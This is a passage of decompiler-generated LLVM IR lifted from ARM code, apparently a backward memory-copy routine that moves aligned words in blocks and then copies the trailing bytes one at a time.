  store i32 %v2_208e8, i32* %lr.global-to-local, align 4
  %v4_208e8 = add i32 %v0_208e8, 4
  store i32 %v4_208e8, i32* %r1.global-to-local, align 4
  %v4_208ec = mul i32 %v2_208e8, 256
  %v5_208ec = or i32 %v4_208ec, %v3_208e4
  store i32 %v5_208ec, i32* @ip, align 4
  %v2_208f0 = inttoptr i32 %v1_208f0 to i32*
  store i32 %v5_208ec, i32* %v2_208f0, align 4
  %v3_208f0 = load i32, i32* @r0, align 4
  %v4_208f0 = add i32 %v3_208f0, 4
  store i32 %v4_208f0, i32* @r0, align 4
  %v0_208f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_208f4 = add i32 %v0_208f4, -4
  store i32 %v1_208f4, i32* %r2.global-to-local, align 4
  %v3_208f4 = sub i32 3, %v0_208f4
  %v4_208f4 = and i32 %v3_208f4, %v0_208f4
  %v5_208f4 = icmp slt i32 %v4_208f4, 0
  %v6_208f4 = icmp slt i32 %v1_208f4, 0
  %v2_208f8 = xor i1 %v6_208f4, %v5_208f4
  br i1 %v2_208f8, label %dec_label_pc_208fc.loopexit, label %dec_label_pc_208e4

dec_label_pc_208fc.loopexit:                      ; preds = %dec_label_pc_208e4
  %v7_208f4 = icmp eq i32 %v0_208f4, 4
  store i1 %v5_208f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_208f4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_208f4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_208fc

dec_label_pc_208fc:                               ; preds = %dec_label_pc_208fc.loopexit, %dec_label_pc_208d8
  %v0_2074c61 = phi i32 [ %v1_208f4, %dec_label_pc_208fc.loopexit ], [ %v1_208dc, %dec_label_pc_208d8 ]
  %v0_208fc = load i32, i32* %r1.global-to-local, align 4
  %v1_208fc = add i32 %v0_208fc, -1
  store i32 %v1_208fc, i32* @r1, align 4
  br label %bb140

dec_label_pc_20904:                               ; preds = %entry
  %v1_20904 = load i32, i32* @r2, align 4
  %v2_20904 = add i32 %v1_20904, %v0_206b0
  store i32 %v2_20904, i32* %r1.global-to-local, align 4
  %v2_20908 = add i32 %v1_20904, %v1_206b0
  store i32 %v2_20908, i32* %r0.global-to-local, align 4
  %v2_2090c = add i32 %v1_20904, -4
  store i32 %v2_2090c, i32* %r2.global-to-local, align 4
  %v4_2090c = sub i32 3, %v1_20904
  %v5_2090c = and i32 %v4_2090c, %v1_20904
  %v6_2090c = icmp slt i32 %v5_2090c, 0
  store i1 %v6_2090c, i1* %cpsr_v.global-to-local, align 1
  %v7_2090c = icmp slt i32 %v2_2090c, 0
  store i1 %v7_2090c, i1* %cpsr_n.global-to-local, align 1
  %v8_2090c = icmp eq i32 %v1_20904, 4
  store i1 %v8_2090c, i1* %cpsr_z.global-to-local, align 1
  %v5_20910 = icmp slt i32 %v1_20904, 4
  br i1 %v5_20910, label %bb150, label %dec_label_pc_20914

dec_label_pc_20914:                               ; preds = %dec_label_pc_20904
  %v1_20914 = urem i32 %v2_20908, 4
  store i32 %v1_20914, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_20914 = icmp eq i32 %v1_20914, 0
  store i1 %v2_20914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_20914, label %dec_label_pc_2091c, label %dec_label_pc_209bc

dec_label_pc_2091c:                               ; preds = %dec_label_pc_20914
  %v1_2091c = urem i32 %v2_20904, 4
  store i32 %v1_2091c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2091c = icmp eq i32 %v1_2091c, 0
  store i1 %v2_2091c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_2091c, label %dec_label_pc_20924, label %dec_label_pc_209e8

dec_label_pc_20924:                               ; preds = %dec_label_pc_2091c, %dec_label_pc_209e0
  %v0_2093c37 = phi i32 [ %v2_20908, %dec_label_pc_2091c ], [ %v0_20a3020, %dec_label_pc_209e0 ]
  %v0_2093836 = phi i32 [ %v2_20904, %dec_label_pc_2091c ], [ %v0_209e0, %dec_label_pc_209e0 ]
  %v0_20924 = phi i32 [ %v2_2090c, %dec_label_pc_2091c ], [ %v2_209d8, %dec_label_pc_209e0 ]
  %v2_20924 = add i32 %v0_20924, -8
  store i32 %v2_20924, i32* %r2.global-to-local, align 4
  %v4_20924 = sub i32 7, %v0_20924
  %v5_20924 = and i32 %v4_20924, %v0_20924
  %v6_20924 = icmp slt i32 %v5_20924, 0
  store i1 %v6_20924, i1* %cpsr_v.global-to-local, align 1
  %v7_20924 = icmp slt i32 %v2_20924, 0
  store i1 %v7_20924, i1* %cpsr_n.global-to-local, align 1
  %v8_20924 = icmp eq i32 %v0_20924, 8
  store i1 %v8_20924, i1* %cpsr_z.global-to-local, align 1
  %v5_20928 = icmp slt i32 %v0_20924, 8
  br i1 %v5_20928, label %dec_label_pc_20974, label %dec_label_pc_2092c

dec_label_pc_2092c:                               ; preds = %dec_label_pc_20924
  %v3_2092c = load i32, i32* @r4, align 4
  %v5_2092c = inttoptr i32 %v3_2092c to i8*
  store i8* %v5_2092c, i8** %stack_var_-8, align 4
  %v8_2092c = load i32, i32* @lr, align 4
  %v2_20930 = add i32 %v0_20924, -28
  store i32 %v2_20930, i32* %r2.global-to-local, align 4
  %v4_20930 = sub i32 27, %v0_20924
  %v5_20930 = and i32 %v4_20930, %v2_20924
  %v6_20930 = icmp slt i32 %v5_20930, 0
  store i1 %v6_20930, i1* %cpsr_v.global-to-local, align 1
  %v7_20930 = icmp slt i32 %v2_20930, 0
  store i1 %v7_20930, i1* %cpsr_n.global-to-local, align 1
  %v8_20930 = icmp eq i32 %v2_20924, 20
  store i1 %v8_20930, i1* %cpsr_z.global-to-local, align 1
  %v5_20934 = icmp slt i32 %v2_20924, 20
  br i1 %v5_20934, label %dec_label_pc_20950, label %dec_label_pc_20938

dec_label_pc_20938:                               ; preds = %dec_label_pc_2092c, %dec_label_pc_20938.dec_label_pc_20938_crit_edge
  %v0_2093c = phi i32 [ %v1_20944, %dec_label_pc_20938.dec_label_pc_20938_crit_edge ], [ %v0_2093c37, %dec_label_pc_2092c ]
  %v0_20938 = phi i32 [ %v0_20938.pre, %dec_label_pc_20938.dec_label_pc_20938_crit_edge ], [ %v0_2093836, %dec_label_pc_2092c ]
  %v1_20938 = add i32 %v0_20938, -4
  %v2_20938 = inttoptr i32 %v1_20938 to i32*
  %v3_20938 = load i32, i32* %v2_20938, align 4
  store i32 %v3_20938, i32* %r3.global-to-local, align 4
  %v4_20938 = add i32 %v0_20938, -8
  %v5_20938 = inttoptr i32 %v4_20938 to i32*
  %v6_20938 = load i32, i32* %v5_20938, align 4
  store i32 %v6_20938, i32* %r4.global-to-local, align 4
  %v7_20938 = add i32 %v0_20938, -12
  %v8_20938 = inttoptr i32 %v7_20938 to i32*
  %v9_20938 = load i32, i32* %v8_20938, align 4
  store i32 %v9_20938, i32* %ip.global-to-local, align 4
  %v10_20938 = add i32 %v0_20938, -16
  %v11_20938 = inttoptr i32 %v10_20938 to i32*
  %v12_20938 = load i32, i32* %v11_20938, align 4
  store i32 %v12_20938, i32* %lr.global-to-local, align 4
  store i32 %v10_20938, i32* %r1.global-to-local, align 4
  %v1_2093c = add i32 %v0_2093c, -16
  %v2_2093c = inttoptr i32 %v1_2093c to i32*
  store i32 %v3_20938, i32* %v2_2093c, align 4
  %v4_2093c = add i32 %v0_2093c, -12
  %v5_2093c = inttoptr i32 %v4_2093c to i32*
  %v6_2093c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_2093c, i32* %v5_2093c, align 4
  %v7_2093c = add i32 %v0_2093c, -8
  %v8_2093c = inttoptr i32 %v7_2093c to i32*
  %v9_2093c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_2093c, i32* %v8_2093c, align 4
  %v10_2093c = add i32 %v0_2093c, -4
  %v11_2093c = inttoptr i32 %v10_2093c to i32*
  %v12_2093c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_2093c, i32* %v11_2093c, align 4
  store i32 %v1_2093c, i32* %r0.global-to-local, align 4
  %v0_20940 = load i32, i32* %r1.global-to-local, align 4
  %v1_20940 = add i32 %v0_20940, -4
  %v2_20940 = inttoptr i32 %v1_20940 to i32*
  %v3_20940 = load i32, i32* %v2_20940, align 4
  store i32 %v3_20940, i32* %r3.global-to-local, align 4
  %v4_20940 = add i32 %v0_20940, -8
  %v5_20940 = inttoptr i32 %v4_20940 to i32*
  %v6_20940 = load i32, i32* %v5_20940, align 4
  store i32 %v6_20940, i32* %r4.global-to-local, align 4
  %v7_20940 = add i32 %v0_20940, -12
  %v8_20940 = inttoptr i32 %v7_20940 to i32*
  %v9_20940 = load i32, i32* %v8_20940, align 4
  store i32 %v9_20940, i32* @ip, align 4
  %v10_20940 = add i32 %v0_20940, -16
  %v11_20940 = inttoptr i32 %v10_20940 to i32*
  %v12_20940 = load i32, i32* %v11_20940, align 4
  store i32 %v12_20940, i32* %lr.global-to-local, align 4
  store i32 %v10_20940, i32* %r1.global-to-local, align 4
  %v1_20944 = add i32 %v0_2093c, -32
  %v2_20944 = inttoptr i32 %v1_20944 to i32*
  store i32 %v3_20940, i32* %v2_20944, align 4
  %v4_20944 = add i32 %v0_2093c, -28
  %v5_20944 = inttoptr i32 %v4_20944 to i32*
  %v6_20944 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_20944, i32* %v5_20944, align 4
  %v7_20944 = add i32 %v0_2093c, -24
  %v8_20944 = inttoptr i32 %v7_20944 to i32*
  %v9_20944 = load i32, i32* @ip, align 4
  store i32 %v9_20944, i32* %v8_20944, align 4
  %v10_20944 = add i32 %v0_2093c, -20
  %v11_20944 = inttoptr i32 %v10_20944 to i32*
  %v12_20944 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_20944, i32* %v11_20944, align 4
  store i32 %v1_20944, i32* %r0.global-to-local, align 4
  %v0_20948 = load i32, i32* %r2.global-to-local, align 4
  %v2_20948 = add i32 %v0_20948, -32
  store i32 %v2_20948, i32* %r2.global-to-local, align 4
  %v6_2094c = icmp slt i32 %v0_20948, 32
  br i1 %v6_2094c, label %dec_label_pc_20950.loopexit, label %dec_label_pc_20938.dec_label_pc_20938_crit_edge

dec_label_pc_20938.dec_label_pc_20938_crit_edge:  ; preds = %dec_label_pc_20938
  %v0_20938.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_20938

dec_label_pc_20950.loopexit:                      ; preds = %dec_label_pc_20938
  %v4_20948 = sub i32 31, %v0_20948
  %v5_20948 = and i32 %v4_20948, %v0_20948
  %v6_20948 = icmp slt i32 %v5_20948, 0
  %v7_20948 = icmp slt i32 %v2_20948, 0
  store i1 %v6_20948, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_20948, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_20950

dec_label_pc_20950:                               ; preds = %dec_label_pc_20950.loopexit, %dec_label_pc_2092c
  %v6_20958 = phi i32 [ %v1_20944, %dec_label_pc_20950.loopexit ], [ %v0_2093c37, %dec_label_pc_2092c ]
  %v0_20960.pr = phi i32 [ %v2_20948, %dec_label_pc_20950.loopexit ], [ %v2_20930, %dec_label_pc_2092c ]
  %v4_20950 = add i32 %v0_20960.pr, 16
  %v6_20950 = sub i32 0, %v0_20960.pr
  %v7_20950 = and i32 %v4_20950, %v6_20950
  %v8_20950 = icmp slt i32 %v7_20950, 0
  store i1 %v8_20950, i1* %cpsr_v.global-to-local, align 1
  %v9_20950 = icmp slt i32 %v4_20950, 0
  store i1 %v9_20950, i1* %cpsr_n.global-to-local, align 1
  %v10_20950 = icmp eq i32 %v4_20950, 0
  store i1 %v10_20950, i1* %cpsr_z.global-to-local, align 1
  %v5_20954 = icmp slt i32 %v0_20960.pr, -16
  br i1 %v5_20954, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_20950
  %v6_20954 = load i32, i32* %r1.global-to-local, align 4
  %v7_20954 = add i32 %v6_20954, -4
  %v8_20954 = inttoptr i32 %v7_20954 to i32*
  %v9_20954 = load i32, i32* %v8_20954, align 4
  store i32 %v9_20954, i32* %r3.global-to-local, align 4
  %v10_20954 = add i32 %v6_20954, -8
  %v11_20954 = inttoptr i32 %v10_20954 to i32*
  %v12_20954 = load i32, i32* %v11_20954, align 4
  store i32 %v12_20954, i32* %r4.global-to-local, align 4
  %v13_20954 = add i32 %v6_20954, -12
  %v14_20954 = inttoptr i32 %v13_20954 to i32*
  %v15_20954 = load i32, i32* %v14_20954, align 4
  store i32 %v15_20954, i32* @ip, align 4
  %v16_20954 = add i32 %v6_20954, -16
  %v17_20954 = inttoptr i32 %v16_20954 to i32*
  %v18_20954 = load i32, i32* %v17_20954, align 4
  store i32 %v18_20954, i32* %lr.global-to-local, align 4
  store i32 %v16_20954, i32* %r1.global-to-local, align 4
  %v7_20958 = add i32 %v6_20958, -16
  %v8_20958 = inttoptr i32 %v7_20958 to i32*
  store i32 %v9_20954, i32* %v8_20958, align 4
  %v10_20958 = add i32 %v6_20958, -12
  %v11_20958 = inttoptr i32 %v10_20958 to i32*
  %v12_20958 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_20958, i32* %v11_20958, align 4
  %v13_20958 = add i32 %v6_20958, -8
  %v14_20958 = inttoptr i32 %v13_20958 to i32*
  %v15_20958 = load i32, i32* @ip, align 4
  store i32 %v15_20958, i32* %v14_20958, align 4
  %v16_20958 = add i32 %v6_20958, -4
  %v17_20958 = inttoptr i32 %v16_20958 to i32*
  %v18_20958 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_20958, i32* %v17_20958, align 4
  store i32 %v7_20958, i32* %r0.global-to-local, align 4
  %v6_2095c = load i32, i32* %r2.global-to-local, align 4
  %v7_2095c = add i32 %v6_2095c, -16
  store i32 %v7_2095c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_20950, %bb147
  %v6_20968 = phi i32 [ %v7_20958, %bb147 ], [ %v6_20958, %dec_label_pc_20950 ]
  %v0_20960 = phi i32 [ %v7_2095c, %bb147 ], [ %v0_20960.pr, %dec_label_pc_20950 ]
  %v4_20960 = add i32 %v0_20960, 20
  store i32 %v4_20960, i32* %r2.global-to-local, align 4
  %v6_20960 = sub i32 0, %v0_20960
  %v7_20960 = and i32 %v4_20960, %v6_20960
  %v8_20960 = icmp slt i32 %v7_20960, 0
  store i1 %v8_20960, i1* %cpsr_v.global-to-local, align 1
  %v9_20960 = icmp slt i32 %v4_20960, 0
  store i1 %v9_20960, i1* %cpsr_n.global-to-local, align 1
  %v10_20960 = icmp eq i32 %v4_20960, 0
  store i1 %v10_20960, i1* %cpsr_z.global-to-local, align 1
  %v5_20964 = icmp slt i32 %v0_20960, -20
  br i1 %v5_20964, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_20964 = load i32, i32* %r1.global-to-local, align 4
  %v7_20964 = add i32 %v6_20964, -4
  %v8_20964 = inttoptr i32 %v7_20964 to i32*
  %v9_20964 = load i32, i32* %v8_20964, align 4
  store i32 %v9_20964, i32* %r3.global-to-local, align 4
  %v10_20964 = add i32 %v6_20964, -8
  %v11_20964 = inttoptr i32 %v10_20964 to i32*
  %v12_20964 = load i32, i32* %v11_20964, align 4
  store i32 %v12_20964, i32* @ip, align 4
  %v13_20964 = add i32 %v6_20964, -12
  %v14_20964 = inttoptr i32 %v13_20964 to i32*
  %v15_20964 = load i32, i32* %v14_20964, align 4
  store i32 %v15_20964, i32* %lr.global-to-local, align 4
  store i32 %v13_20964, i32* %r1.global-to-local, align 4
  %v7_20968 = add i32 %v6_20968, -12
  %v8_20968 = inttoptr i32 %v7_20968 to i32*
  store i32 %v9_20964, i32* %v8_20968, align 4
  %v10_20968 = add i32 %v6_20968, -8
  %v11_20968 = inttoptr i32 %v10_20968 to i32*
  %v12_20968 = load i32, i32* @ip, align 4
  store i32 %v12_20968, i32* %v11_20968, align 4
  %v13_20968 = add i32 %v6_20968, -4
  %v14_20968 = inttoptr i32 %v13_20968 to i32*
  %v15_20968 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_20968, i32* %v14_20968, align 4
  store i32 %v7_20968, i32* %r0.global-to-local, align 4
  %v6_2096c = load i32, i32* %r2.global-to-local, align 4
  %v7_2096c = add i32 %v6_2096c, -12
  store i32 %v7_2096c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_2098c45 = phi i32 [ %v6_20968, %.thread2 ], [ %v7_20968, %bb148 ]
  %v0_2097443 = phi i32 [ %v4_20960, %.thread2 ], [ %v7_2096c, %bb148 ]
  %v2_20970 = load i8*, i8** %stack_var_-8, align 4
  %v3_20970 = ptrtoint i8* %v2_20970 to i32
  store i32 %v3_20970, i32* @r4, align 4
  store i32 %v8_2092c, i32* @lr, align 4
  br label %dec_label_pc_20974

dec_label_pc_20974:                               ; preds = %dec_label_pc_20924, %.thread4
  %v7_20984 = phi i32 [ %v0_2093c37, %dec_label_pc_20924 ], [ %v6_2098c45, %.thread4 ]
  %v0_20974 = phi i32 [ %v2_20924, %dec_label_pc_20924 ], [ %v0_2097443, %.thread4 ]
  %v2_20974 = add i32 %v0_20974, 8
  store i32 %v2_20974, i32* %r2.global-to-local, align 4
  %v4_20974 = sub i32 0, %v0_20974
  %v5_20974 = and i32 %v2_20974, %v4_20974
  %v6_20974 = icmp slt i32 %v5_20974, 0
  store i1 %v6_20974, i1* %cpsr_v.global-to-local, align 1
  %v7_20974 = icmp slt i32 %v2_20974, 0
  store i1 %v7_20974, i1* %cpsr_n.global-to-local, align 1
  %v8_20974 = icmp eq i32 %v2_20974, 0
  store i1 %v8_20974, i1* %cpsr_z.global-to-local, align 1
  %v5_20978 = icmp slt i32 %v0_20974, -8
  br i1 %v5_20978, label %bb150, label %dec_label_pc_2097c

dec_label_pc_2097c:                               ; preds = %dec_label_pc_20974
  %v6_2097c = add i32 %v0_20974, 4
  store i32 %v6_2097c, i32* %r2.global-to-local, align 4
  %v8_2097c = sub i32 -5, %v0_20974
  %v9_2097c = and i32 %v8_2097c, %v2_20974
  %v10_2097c = icmp slt i32 %v9_2097c, 0
  store i1 %v10_2097c, i1* %cpsr_v.global-to-local, align 1
  %v11_2097c = icmp slt i32 %v6_2097c, 0
  store i1 %v11_2097c, i1* %cpsr_n.global-to-local, align 1
  %v12_2097c = icmp eq i32 %v2_20974, 4
  store i1 %v12_2097c, i1* %cpsr_z.global-to-local, align 1
  %v5_20980 = icmp slt i32 %v2_20974, 4
  %v6_20980 = load i32, i32* %r1.global-to-local, align 4
  %v7_20980 = add i32 %v6_20980, -4
  %v8_20980 = inttoptr i32 %v7_20980 to i32*
  %v9_20980 = load i32, i32* %v8_20980, align 4
  store i32 %v9_20980, i32* %r3.global-to-local, align 4
  br i1 %v5_20980, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_2097c
  store i32 %v7_20980, i32* %r1.global-to-local, align 4
  %v8_20984 = add i32 %v7_20984, -4
  %v9_20984 = inttoptr i32 %v8_20984 to i32*
  store i32 %v9_20980, i32* %v9_20984, align 4
  %v10_20984 = load i32, i32* %r0.global-to-local, align 4
  %v11_20984 = add i32 %v10_20984, -4
  store i32 %v11_20984, i32* %r0.global-to-local, align 4
  %v0_20994.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_2097c
  %v10_20988 = add i32 %v6_20980, -8
  %v11_20988 = inttoptr i32 %v10_20988 to i32*
  %v12_20988 = load i32, i32* %v11_20988, align 4
  store i32 %v12_20988, i32* @ip, align 4
  store i32 %v10_20988, i32* %r1.global-to-local, align 4
  %v7_2098c = add i32 %v7_20984, -8
  %v8_2098c = inttoptr i32 %v7_2098c to i32*
  store i32 %v9_20980, i32* %v8_2098c, align 4
  %v10_2098c = add i32 %v7_20984, -4
  %v11_2098c = inttoptr i32 %v10_2098c to i32*
  %v12_2098c = load i32, i32* @ip, align 4
  store i32 %v12_2098c, i32* %v11_2098c, align 4
  store i32 %v7_2098c, i32* %r0.global-to-local, align 4
  %v6_20990 = load i32, i32* %r2.global-to-local, align 4
  %v7_20990 = add i32 %v6_20990, -4
  store i32 %v7_20990, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_20974, %dec_label_pc_20904, %dec_label_pc_20b38, %dec_label_pc_20acc, %dec_label_pc_20a60, %bb149
  %v2_20998 = phi i32 [ %v11_20984, %.thread8 ], [ %v0_20a3020, %.thread14 ], [ %v7_20984, %dec_label_pc_20974 ], [ %v2_20908, %dec_label_pc_20904 ], [ %v2_209a453, %dec_label_pc_20b38 ], [ %v2_209a452, %dec_label_pc_20acc ], [ %v2_209a451, %dec_label_pc_20a60 ], [ %v7_2098c, %bb149 ]
  %v0_20994 = phi i32 [ %v0_20994.pre, %.thread8 ], [ %v2_209d8, %.thread14 ], [ %v2_20974, %dec_label_pc_20974 ], [ %v2_2090c, %dec_label_pc_20904 ], [ %v0_2099449, %dec_label_pc_20b38 ], [ %v0_2099448, %dec_label_pc_20acc ], [ %v0_2099447, %dec_label_pc_20a60 ], [ %v7_20990, %bb149 ]
  %v1_20994 = add i32 %v0_20994, 4
  store i32 %v1_20994, i32* %r2.global-to-local, align 4
  %v3_20994 = sub i32 0, %v0_20994
  %v4_20994 = and i32 %v1_20994, %v3_20994
  %v5_20994 = icmp slt i32 %v4_20994, 0
  store i1 %v5_20994, i1* %cpsr_v.global-to-local, align 1
  %v6_20994 = icmp slt i32 %v1_20994, 0
  store i1 %v6_20994, i1* %cpsr_n.global-to-local, align 1
  %v7_20994 = icmp eq i32 %v1_20994, 0
  store i1 %v7_20994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_20994, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_2099c = add i32 %v0_20994, 2
  %v3_2099c = sub i32 -3, %v0_20994
  %v4_2099c = and i32 %v3_2099c, %v1_20994
  %v5_2099c = icmp slt i32 %v4_2099c, 0
  store i1 %v5_2099c, i1* %cpsr_v.global-to-local, align 1
  %v6_2099c = icmp slt i32 %v1_2099c, 0
  store i1 %v6_2099c, i1* %cpsr_n.global-to-local, align 1
  %v7_2099c = icmp eq i32 %v1_20994, 2
  store i1 %v7_2099c, i1* %cpsr_z.global-to-local, align 1
  %v0_209a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_209a0 = add i32 %v0_209a0, -1
  %v2_209a0 = inttoptr i32 %v1_209a0 to i8*
  %v3_209a0 = load i8, i8* %v2_209a0, align 1
  %v4_209a0 = zext i8 %v3_209a0 to i32
  store i32 %v4_209a0, i32* %r3.global-to-local, align 4
  store i32 %v1_209a0, i32* %r1.global-to-local, align 4
  %v3_209a4 = add i32 %v2_20998, -1
  %v4_209a4 = inttoptr i32 %v3_209a4 to i8*
  store i8 %v3_209a0, i8* %v4_209a4, align 1
  %v5_209a4 = load i32, i32* %r0.global-to-local, align 4
  %v6_209a4 = add i32 %v5_209a4, -1
  store i32 %v6_209a4, i32* %r0.global-to-local, align 4
  %v0_209a8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_209a8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_209a8 = xor i1 %v0_209a8, %v1_209a8
  br i1 %v2_209a8, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_209a8 = load i32, i32* %r1.global-to-local, align 4
  %v4_209a8 = add i32 %v3_209a8, -1
  %v5_209a8 = inttoptr i32 %v4_209a8 to i8*
  %v6_209a8 = load i8, i8* %v5_209a8, align 1
  %v7_209a8 = zext i8 %v6_209a8 to i32
  store i32 %v7_209a8, i32* %r3.global-to-local, align 4
  store i32 %v4_209a8, i32* %r1.global-to-local, align 4
  %v6_209ac = add i32 %v5_209a4, -2
  %v7_209ac = inttoptr i32 %v6_209ac to i8*
  store i8 %v6_209a8, i8* %v7_209ac, align 1
  %v8_209ac = load i32, i32* %r0.global-to-local, align 4
  %v9_209ac = add i32 %v8_209ac, -1
  store i32 %v9_209ac, i32* %r0.global-to-local, align 4
  %v1_209b0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_209b0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_209b4 = phi i32 [ %v9_209ac, %bb152 ], [ %v6_209a4, %bb151 ]
  %v2_209b4 = phi i1 [ %v2_209b0.pre, %bb152 ], [ %v1_209a8, %bb151 ]
  %v1_209b4 = phi i1 [ %v1_209b0.pre, %bb152 ], [ %v0_209a8, %bb151 ]
  %v0_209b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_209b0 = xor i1 %v2_209b4, %v1_209b4
  %v4_209b0 = or i1 %v0_209b0, %v3_209b0
  br i1 %v4_209b0, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_209b0 = load i32, i32* %r1.global-to-local, align 4
  %v6_209b0 = add i32 %v5_209b0, -1
  %v7_209b0 = inttoptr i32 %v6_209b0 to i8*
  %v8_209b0 = load i8, i8* %v7_209b0, align 1
  %v9_209b0 = zext i8 %v8_209b0 to i32
  store i32 %v9_209b0, i32* %r3.global-to-local, align 4
  store i32 %v6_209b0, i32* %r1.global-to-local, align 4
  %v8_209b4 = add i32 %v7_209b4, -1
  %v9_209b4 = inttoptr i32 %v8_209b4 to i8*
  store i8 %v8_209b0, i8* %v9_209b4, align 1
  %v10_209b4 = load i32, i32* %r0.global-to-local, align 4
  %v11_209b4 = add i32 %v10_209b4, -1
  store i32 %v11_209b4, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_209bc:                               ; preds = %dec_label_pc_20914
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_209bc = icmp eq i32 %v1_20914, 1
  store i1 %v8_209bc, i1* %cpsr_n.global-to-local, align 1
  %v9_209bc = icmp eq i32 %v1_20914, 2
  store i1 %v9_209bc, i1* %cpsr_z.global-to-local, align 1
  %v1_209c0 = add i32 %v2_20904, -1
  %v2_209c0 = inttoptr i32 %v1_209c0 to i8*
  %v3_209c0 = load i8, i8* %v2_209c0, align 1
  %v4_209c0 = zext i8 %v3_209c0 to i32
  store i32 %v4_209c0, i32* %r3.global-to-local, align 4
  store i32 %v1_209c0, i32* %r1.global-to-local, align 4
  %v3_209c4 = add i32 %v2_20908, -1
  %v4_209c4 = inttoptr i32 %v3_209c4 to i8*
  store i8 %v3_209c0, i8* %v4_209c4, align 1
  %v5_209c4 = load i32, i32* %r0.global-to-local, align 4
  %v6_209c4 = add i32 %v5_209c4, -1
  store i32 %v6_209c4, i32* %r0.global-to-local, align 4
  br i1 %v8_209bc, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_209bc
  %v6_209c8 = load i32, i32* %r1.global-to-local, align 4
  %v7_209c8 = add i32 %v6_209c8, -1
  %v8_209c8 = inttoptr i32 %v7_209c8 to i8*
  %v9_209c8 = load i8, i8* %v8_209c8, align 1
  %v10_209c8 = zext i8 %v9_209c8 to i32
  store i32 %v10_209c8, i32* %r3.global-to-local, align 4
  store i32 %v7_209c8, i32* %r1.global-to-local, align 4
  %v9_209cc = add i32 %v5_209c4, -2
  %v10_209cc = inttoptr i32 %v9_209cc to i8*
  store i8 %v9_209c8, i8* %v10_209cc, align 1
  %v11_209cc = load i32, i32* %r0.global-to-local, align 4
  %v12_209cc = add i32 %v11_209cc, -1
  store i32 %v12_209cc, i32* %r0.global-to-local, align 4
  br i1 %v9_209bc, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_209d0 = load i32, i32* %r1.global-to-local, align 4
  %v9_209d0 = add i32 %v8_209d0, -1
  %v10_209d0 = inttoptr i32 %v9_209d0 to i8*
  %v11_209d0 = load i8, i8* %v10_209d0, align 1
  %v12_209d0 = zext i8 %v11_209d0 to i32
  store i32 %v12_209d0, i32* %r3.global-to-local, align 4
  store i32 %v9_209d0, i32* %r1.global-to-local, align 4
  %v11_209d4 = add i32 %v11_209cc, -2
  %v12_209d4 = inttoptr i32 %v11_209d4 to i8*
  store i8 %v11_209d0, i8* %v12_209d4, align 1
  %v13_209d4 = load i32, i32* %r0.global-to-local, align 4
  %v14_209d4 = add i32 %v13_209d4, -1
  store i32 %v14_209d4, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_209bc, %bb155
  %v0_20a3020 = phi i32 [ %v12_209cc, %bb154 ], [ %v6_209c4, %dec_label_pc_209bc ], [ %v14_209d4, %bb155 ]
  %v0_209d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_209d8 = load i32, i32* @ip, align 4
  %v2_209d8 = sub i32 %v0_209d8, %v1_209d8
  store i32 %v2_209d8, i32* %r2.global-to-local, align 4
  %v4_209d8 = xor i32 %v1_209d8, %v0_209d8
  %v5_209d8 = xor i32 %v2_209d8, %v0_209d8
  %v6_209d8 = and i32 %v5_209d8, %v4_209d8
  %v7_209d8 = icmp slt i32 %v6_209d8, 0
  store i1 %v7_209d8, i1* %cpsr_v.global-to-local, align 1
  %v8_209d8 = icmp slt i32 %v2_209d8, 0
  store i1 %v8_209d8, i1* %cpsr_n.global-to-local, align 1
  %v9_209d8 = icmp eq i32 %v0_209d8, %v1_209d8
  store i1 %v9_209d8, i1* %cpsr_z.global-to-local, align 1
  %v5_209dc = icmp slt i32 %v0_209d8, %v1_209d8
  br i1 %v5_209dc, label %bb150, label %dec_label_pc_209e0

dec_label_pc_209e0:                               ; preds = %.thread14
  %v0_209e0 = load i32, i32* %r1.global-to-local, align 4
